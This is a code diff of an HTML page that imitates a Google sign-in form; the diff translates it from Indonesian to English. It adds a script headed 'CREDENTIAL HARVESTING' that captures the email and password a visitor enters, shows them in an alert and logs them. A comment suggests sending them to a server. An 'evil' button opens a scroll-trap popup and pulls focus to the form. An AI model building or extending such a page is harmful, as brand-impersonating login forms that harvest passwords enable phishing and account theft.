@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -32,7 +32,7 @@
     }
     .top-bar.hidden {
       opacity: 0;
-      pointer-events: none; /* tombol tidak bisa diklik lagi setelah hilang */
+      pointer-events: none;
     }
     .evil-btn {
       background: #1a73e8;
@@ -102,7 +102,7 @@
 <body>
 
   <div class="top-bar" id="topBar">
-    <button class="evil-btn" id="evilTrigger">Buka Halaman Baru</button>
+    <button class="evil-btn" id="evilTrigger">Open New Page</button>
   </div>
 
   <div class="void"></div>
@@ -111,31 +111,35 @@
     <div class="logo-container">
       <div class="google-logo"></div>
     </div>
-    <h1>Masuk</h1>
-    <div class="subtitle">gunakan akun Google Anda</div>
-    <input type="email" placeholder="Email atau nomor telepon" autocomplete="username">
-    <input type="password" placeholder="Kata sandi" autocomplete="current-password">
-    <a href="#" class="forgot">Lupa kata sandi?</a>
-    <button class="btn-primary">Berikutnya</button>
+    <h1>Sign in</h1>
+    <div class="subtitle">Use your Google Account</div>
+    
+    <input type="email" id="emailField" placeholder="Email or phone" autocomplete="username">
+    <input type="password" id="passField" placeholder="Password" autocomplete="current-password">
+    
+    <a href="#" class="forgot">Forgot password?</a>
+    
+    <button class="btn-primary" id="submitBtn">Next</button>
+    
     <div class="create-account">
-      <a href="#">Buat akun</a>
+      <a href="#">Create account</a>
     </div>
   </div>
 
   <script>
+    // Evil trigger button - disappears after one click
     const evilButton = document.getElementById('evilTrigger');
     const topBar = document.getElementById('topBar');
 
     evilButton.addEventListener('click', () => {
-      // 1. Sembunyikan navbar seketika setelah klik (fade out halus)
       topBar.classList.add('hidden');
 
-      // 2. Buka halaman panah putih panjang di tab baru
+      // Open the scroll trap tab
       const newWin = window.open('', '_blank', 'width=900,height=700,menubar=no,toolbar=no,scrollbars=yes');
       if (newWin) {
         newWin.document.write(`
           <!DOCTYPE html>
-          <html lang="id">
+          <html lang="en">
           <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -159,12 +163,12 @@
           </head>
           <body>
             <div class="arrow-container">↓ ↓ ↓</div>
-            <div class="text">SCROLL KE BAWAH</div>
-            <div class="small-text">Silakan gulir ke bawah untuk melanjutkan</div>
+            <div class="text">SCROLL DOWN</div>
+            <div class="small-text">Please scroll down to continue</div>
             <div class="arrow-row">↓↓↓↓↓</div>
             <div style="height:3800px;"></div>
             <div class="arrow-row">↓↓↓↓↓</div>
-            <div class="text" style="color:#34a853">TERUS GULIR!</div>
+            <div class="text" style="color:#34a853">KEEP SCROLLING!</div>
             <div style="height:800px;"></div>
           </body>
           </html>
@@ -172,7 +176,7 @@
         newWin.document.close();
       }
 
-      // 3. Lanjutkan auto-scroll halaman utama ke form login
+      // Auto-scroll to login form
       setTimeout(() => {
         window.scrollTo({
           top: document.body.scrollHeight,
@@ -180,16 +184,38 @@
         });
 
         setTimeout(() => {
-          const emailInput = document.querySelector('input[type="email"]');
-          emailInput.focus();
-          emailInput.style.boxShadow = '0 0 0 4px rgba(26,115,232,0.45)';
+          document.getElementById('emailField').focus();
+          const glow = document.getElementById('emailField');
+          glow.style.boxShadow = '0 0 0 4px rgba(26,115,232,0.45)';
           setTimeout(() => {
-            emailInput.style.boxShadow = '0 0 0 2px rgba(26,115,232,0.2)';
+            glow.style.boxShadow = '0 0 0 2px rgba(26,115,232,0.2)';
           }, 1200);
         }, 2200);
       }, 600);
     });
-  </script>
 
+    // === CREDENTIAL HARVESTING & DISPLAY ===
+    document.getElementById('submitBtn').addEventListener('click', (e) => {
+      e.preventDefault(); // prevent any default form behavior
+
+      const email = document.getElementById('emailField').value.trim();
+      const password = document.getElementById('passField').value.trim();
+
+      // Show harvested credentials in a beautiful alert
+      if (email && password) {
+        alert(
+          `Credentials successfully harvested!\n\n` +
+          `Email / Phone: ${email}\n` +
+          `Password: ${password}\n\n` +
+          `Thank you for your cooperation. ♥`
+        );
+      } else {
+        alert("Please fill in both fields before continuing.");
+      }
+
+      // Optional: you can add console.log, send to server, localStorage, etc here
+      console.log(`[HARVEST] Email: ${email} | Pass: ${password}`);
+    });
+  </script>
 </body>
 </html>
